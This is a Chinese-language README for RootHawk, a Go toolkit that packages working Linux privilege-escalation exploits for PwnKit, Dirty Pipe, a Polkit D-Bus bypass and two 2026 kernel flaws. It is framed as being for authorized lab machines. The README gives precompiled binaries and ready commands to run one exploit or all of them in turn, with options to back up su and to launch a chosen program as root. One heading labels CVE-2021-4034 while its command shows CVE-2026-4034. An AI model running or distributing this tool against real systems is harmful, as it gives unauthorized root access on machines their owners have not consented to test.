<img width="734" height="515" alt="image" src="https://github.com/user-attachments/assets/c50f8e06-0974-4fe8-a84c-4f17afe11672" /># RootHawk

RootHawk 是一个 Linux 本地安全测试终端工具，用 Go 编写，面向授权靶机、虚拟机和实验环境。

## 效果展示

### DirtyFrag
```bash
./RootHawk-amd64 -e CVE-2026-43284
```
<img width="714" height="440" alt="image" src="https://github.com/user-attachments/assets/f4a5a64c-837d-4029-98d1-3797016a83c4" />

# CopyFai
```
./RootHawk-amd64 -e CVE-2026-31431
```
<img width="734" height="513" alt="image" src="https://github.com/user-attachments/assets/3ae169cf-e605-4fc8-b493-5a4b68c87179" />

# CVE-2021-4034
```
./RootHawk-amd64 -e CVE-2026-4034
```
<img width="601" height="240" alt="image" src="https://github.com/user-attachments/assets/923d18f2-1dda-4ee8-b402-3428a31e6bca" />


## 目录结构

```text
RootHawk/
├── bin/
│   ├── RootHawk-amd64
│   ├── RootHawk-arm64
│   └── RootHawk-386
├── pkg/
│   ├── exploits/
│   │   ├── cve20214034/
│   │   ├── cve20213560/
│   │   ├── cve20220847/
│   │   ├── cve202631431/
│   │   └── cve202643284/
│   │       ├── exploit.go
│   │       └── exp.c
│   ├── logger/
│   ├── payloads/
│   ├── pipe/
│   ├── shell/
│   └── state/
├── roothawk.go
├── go.mod
├── go.sum
├── NOTICE.md
└── README.md
```

## 已编译版本

```text
bin/RootHawk-amd64
bin/RootHawk-arm64
bin/RootHawk-386
```

Ubuntu amd64 虚拟机使用：

```bash
chmod +x RootHawk-amd64
./RootHawk-amd64 -help
```

## 使用方法

查看帮助：

```bash
./RootHawk-amd64 -help
```

查看模块列表：

```bash
./RootHawk-amd64 -list
```

执行指定 CVE：

```bash
./RootHawk-amd64 -e CVE-2022-0847
```

按顺序执行全部模块：

```bash
./RootHawk-amd64 -any
```

## 参数说明

```text
-list              显示当前集成的 CVE 模块
-e <名称>          执行指定 CVE 或别名
-any               按列表顺序执行全部模块
-pk <路径>         指定 CVE-2021-4034 使用的 pkexec 路径，默认 /usr/bin/pkexec
-backup <路径>     CVE-2026-31431 执行前备份 su 到指定路径
-exec <路径>       CVE-2026-31431 提权后执行指定程序，而不是进入 su
-v                 尽量输出详细日志
-help              显示帮助
```

## 集成模块

| CVE 编号 | 常见名称/别名 | 漏洞类型/组件 |
| --- | --- | --- |
| CVE-2026-31431 | Copy Fail | Linux Kernel 本地提权，涉及 crypto / AF_ALG / algif_aead 相关逻辑问题。 |
| CVE-2026-43284 | Dirty Frag，也有人叫 CopyFail2 | Linux Kernel 本地提权，涉及 xfrm/esp、shared skb frags 等内核网络/数据包处理路径。 |
| CVE-2021-4034 | PwnKit | Polkit 的 pkexec 本地提权漏洞。 |
| CVE-2021-3560 | Polkit D-Bus 权限绕过 / Polkit Authentication Bypass | Polkit 本地提权，可通过 D-Bus 请求绕过凭据检查，提升权限；没有像 PwnKit 那样特别统一的短名字。 |
| CVE-2022-0847 | Dirty Pipe | Linux Kernel 本地提权，管道机制相关漏洞。 |

## 示例

```bash
./RootHawk-amd64 -list
./RootHawk-amd64 -e CVE-2021-4034
./RootHawk-amd64 -e CVE-2021-4034 -pk /usr/bin/pkexec
./RootHawk-amd64 -e CVE-2026-31431 -backup /tmp/su.bak
./RootHawk-amd64 -e CVE-2026-31431 -backup /tmp/su.bak -exec /tmp/root-task
./RootHawk-amd64 -e CVE-2026-43284 -v
./RootHawk-amd64 -any
```
